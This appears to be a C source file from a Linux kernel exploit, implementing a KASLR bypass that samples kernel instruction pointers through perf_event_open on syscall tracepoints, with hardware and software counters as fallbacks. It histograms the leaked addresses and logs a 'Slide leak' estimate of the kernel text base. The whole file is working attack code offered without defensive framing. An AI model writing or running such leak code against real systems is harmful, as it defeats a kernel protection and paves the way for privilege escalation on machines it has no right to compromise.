#include "common.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <fcntl.h>

struct perf_sample { struct perf_event_header h; uint64_t ip,pid_tid,time,addr,period; uint64_t cc[32]; };

#define PERF_CONTEXT_HV     ((uint64_t)-32)
#define PERF_CONTEXT_KERNEL ((uint64_t)-128)
#define PERF_CONTEXT_USER   ((uint64_t)-512)

static int read_tracepoint_id(const char *syscall_name) {
    static const char *paths[] = {
        "/sys/kernel/tracing/events/syscalls/sys_enter_%s/id",
        "/sys/kernel/debug/tracing/events/syscalls/sys_enter_%s/id",
        NULL
    };
    for (int i = 0; paths[i]; i++) {
        char fpath[256];
        snprintf(fpath, sizeof(fpath), paths[i], syscall_name);
        int fd = open(fpath, O_RDONLY);
        if (fd >= 0) {
            char buf[32];
            int n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n > 0) { buf[n] = 0; int id = atoi(buf); if (id > 0) return id; }
        }
    }
    return 0;
}

static inline int is_kernel_text_ptr(uint64_t v) {
    if (v > 0xffffffffffff0000ULL) return 0;
    if (v < 0xffff000000000000ULL) return 0;
    return 1;
}

uint64_t getkerneltextstart() {
    int tp_id = 0;

    tp_id = read_tracepoint_id("getpid");
    if (!tp_id) tp_id = read_tracepoint_id("gettid");
    if (!tp_id) tp_id = read_tracepoint_id("getuid");
    pr_debug("Tp_id=%d\n", tp_id);

    struct perf_event_attr a;
    memset(&a, 0, sizeof(a));
    const char *strategy = "unknown";

    if (tp_id > 0) {
        a.type           = PERF_TYPE_TRACEPOINT;
        a.size           = sizeof(a);
        a.config         = tp_id;
        a.sample_period  = 1;
        a.exclude_user   = 0;
        a.exclude_kernel = 0;
        strategy = "tracepoint";
    } else {
        a.type           = PERF_TYPE_HARDWARE;
        a.size           = sizeof(a);
        a.config         = PERF_COUNT_HW_CPU_CYCLES;
        a.sample_period  = 50000;
        a.exclude_user   = 1;
        a.exclude_kernel = 0;
        strategy = "HW_CPU_CYCLES";
    }

    a.sample_type      = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN | PERF_SAMPLE_TID;
    a.sample_max_stack = 24;
    a.disabled         = 1;
    a.exclude_hv       = 1;

    pr_debug("[*] Strategy: %s\n", strategy);
    int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);

    if (fd < 0 && tp_id == 0) {
        pr_debug("[*] HW cycles failed (errno=%d), trying SW PAGE_FAULTS\n", errno);
        memset(&a, 0, sizeof(a));
        a.type           = PERF_TYPE_SOFTWARE;
        a.config         = PERF_COUNT_SW_PAGE_FAULTS;
        a.sample_period  = 1;
        a.exclude_user   = 0;
        a.exclude_kernel = 0;
        a.sample_type    = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN | PERF_SAMPLE_TID;
        a.sample_max_stack= 24;
        a.disabled       = 1;
        a.exclude_hv     = 1;
        strategy = "SW_PAGE_FAULTS";
        a.size           = sizeof(a);
        fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
    }

    if (fd < 0 && tp_id == 0) {
        pr_debug("[*] Page faults failed (errno=%d), trying CPU_CLOCK\n", errno);
        memset(&a, 0, sizeof(a));
        a.type           = PERF_TYPE_SOFTWARE;
        a.config         = PERF_COUNT_SW_CPU_CLOCK;
        a.sample_period  = 100000;
        a.exclude_user   = 0;
        a.exclude_kernel = 0;
        a.sample_type    = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN | PERF_SAMPLE_TID;
        a.sample_max_stack= 24;
        a.disabled       = 1;
        a.exclude_hv     = 1;
        strategy = "SW_CPU_CLOCK";
        a.size           = sizeof(a);
        fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
    }

    if (fd < 0) {
        pr_warning("FATAL: perf_event_open errno=%d\n", errno);
        return 1;
    }

    int   pg = sysconf(_SC_PAGESIZE);
    size_t sz = (size_t)pg * 33;
    void *b = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (b == MAP_FAILED) { pr_warning("Mmap errno=%d\n", errno); close(fd); return 1; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    volatile int x = 0;
    for (int i = 0; i < 3000000; i++) {
        syscall(__NR_gettid);
        getpid();
        x += i;
    }

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *h = b;
    uint64_t hd = h->data_head, tl = 0;
    char    *d  = (char *)b + h->data_offset;
    uint64_t ds = h->data_size;

    if (hd == 0) { pr_debug("[!] data_head=0\n"); munmap(b, sz); close(fd); return 1; }
    pr_debug("Data_head = %016lx\n", hd);

    #define MAX_SAMPLES 500000
    uint64_t *kaddrs  = malloc(MAX_SAMPLES * sizeof(uint64_t));
    int      kcount   = 0;
    int      total_samples = 0;
    uint64_t top16_buckets[256] = {0};

    while (tl < hd && kcount < MAX_SAMPLES) {
        struct perf_sample *s = (struct perf_sample *)(d + (tl % ds));
        tl += s->h.size;
        total_samples++;

        uint64_t all[33];
        int      ac = 1;
        all[0] = s->ip;
        for (int c = 0; c < 24 && s->cc[c]; c++)
            all[ac++] = s->cc[c];

        for (int i = 0; i < ac; i++) {
            if (!is_kernel_text_ptr(all[i])) continue;
            kaddrs[kcount++] = all[i];
            top16_buckets[(all[i] >> 56) & 0xff]++;
        }
    }

    if (kcount == 0) {
        pr_warning("[!] No kernel text addresses found.\n");
        free(kaddrs); munmap(b, sz); close(fd); return 1;
    }

    uint64_t kmin = ~0ULL, kmax = 0;
    for (int i = 0; i < kcount; i++) {
        if (kaddrs[i] < kmin) kmin = kaddrs[i];
        if (kaddrs[i] > kmax) kmax = kaddrs[i];
    }

    #define BUCKET_SHIFT 21
    #define NUM_BUCKETS  4096
    int *hist = calloc(NUM_BUCKETS, sizeof(int));
    uint64_t base_addr = kmin & ~((1ULL << BUCKET_SHIFT) - 1);

    for (int i = 0; i < kcount; i++) {
        uint64_t off = (kaddrs[i] - base_addr) >> BUCKET_SHIFT;
        if (off < NUM_BUCKETS) hist[off]++;
    }

    int max_hits = 0, max_bucket = 0;
    for (int i = 0; i < NUM_BUCKETS; i++) {
        if (hist[i] > max_hits) { max_hits = hist[i]; max_bucket = i; }
    }

    int threshold = max_hits / 10;
    int first_bucket = -1, last_bucket = 0;
    for (int i = 0; i < NUM_BUCKETS; i++) {
        if (hist[i] > threshold) {
            if (first_bucket < 0) first_bucket = i;
            last_bucket = i;
        }
    }

    uint64_t text_start = base_addr + ((uint64_t)first_bucket << BUCKET_SHIFT);

    uint64_t uniq[32]; int ucnt = 0;
    for (int i = 0; i < kcount && ucnt < 20; i++) {
        int dup = 0;
        for (int j = 0; j < ucnt; j++)
            if (uniq[j] == kaddrs[i]) { dup = 1; break; }
        if (!dup) uniq[ucnt++] = kaddrs[i];
    }

    for (int i = 1; i < ucnt; i++) {
        uint64_t tmp = uniq[i];
        int j = i - 1;
        while (j >= 0 && uniq[j] > tmp) { uniq[j+1] = uniq[j]; j--; }
        uniq[j+1] = tmp;
    }

    pr_info("Slide leak: strategy=%s samples=%d ktext_ptrs=%d\n",
            strategy, total_samples, kcount);
    pr_info("Slide leak: kmin=%016llx kmax=%016llx span=%lldMB\n",
            (unsigned long long)kmin, (unsigned long long)kmax,
            (long long)((kmax - kmin) >> 20));
    pr_info("Slide leak: densest_bucket=%016llx hits=%d  first_bucket=%016llx (>%d)\n",
            (unsigned long long)(base_addr + ((uint64_t)max_bucket << BUCKET_SHIFT)),
            max_hits,
            (unsigned long long)(base_addr + ((uint64_t)first_bucket << BUCKET_SHIFT)),
            threshold);
    pr_info("Slide leak: chosen text_start(+0x0)=%016llx\n",
            (unsigned long long)text_start);
    for (int i = 0; i < ucnt && i < 12; i++)
        pr_info("Slide leak: low[%2d]=%016llx\n", i,
                (unsigned long long)uniq[i]);

    free(hist);
    free(kaddrs);
    munmap(b, sz);
    close(fd);
    return text_start;
}
